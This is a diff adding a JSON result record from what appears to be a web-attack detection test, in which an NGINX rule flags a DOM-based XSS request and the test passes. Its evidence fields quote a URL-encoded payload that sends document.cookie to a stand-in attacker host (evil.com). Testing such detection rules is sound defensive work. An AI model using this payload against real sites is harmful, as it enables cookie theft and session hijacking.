@@ -1,0 +1,14 @@
+{
+  "pattern_id": "XSS_DOM_001",
+  "test_id": "XSS_DOM_001-1766305809708-j12phf",
+  "category": "xss",
+  "detected": true,
+  "latency_ms": 24000,
+  "evidence": "08:30:09.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1766305809708-j12phf pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET",
+  "rule_name": "[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1766305809708-j12phf pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET",
+  "expected_rule": "",
+  "rule_id": "",
+  "sent_at": 1766305833000,
+  "detected_at": 1766305809000,
+  "status": "passed"
+}
